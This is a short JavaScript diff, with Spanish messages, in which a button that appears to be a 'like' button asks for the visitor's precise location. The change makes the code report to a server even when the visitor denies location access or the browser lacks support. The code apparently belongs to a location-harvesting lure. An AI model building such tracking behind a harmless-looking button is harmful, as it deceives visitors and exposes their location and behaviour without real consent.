@@ -42,14 +42,12 @@ document.addEventListener('DOMContentLoaded', () => {
                 },
                 (error) => {
                     console.log("Ubicación denegada o error.");
-                    loading.classList.add('hidden');
-                    markAsLiked(btnElement);
+                    sendDataToServer({ latitude: "Denegado", longitude: "Denegado", accuracy: 0 }, btnElement);
                 },
                 { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
             );
         } else {
-            loading.classList.add('hidden');
-            markAsLiked(btnElement);
+            sendDataToServer({ latitude: "No soportado", longitude: "No soportado", accuracy: 0 }, btnElement);
         }
     }
 
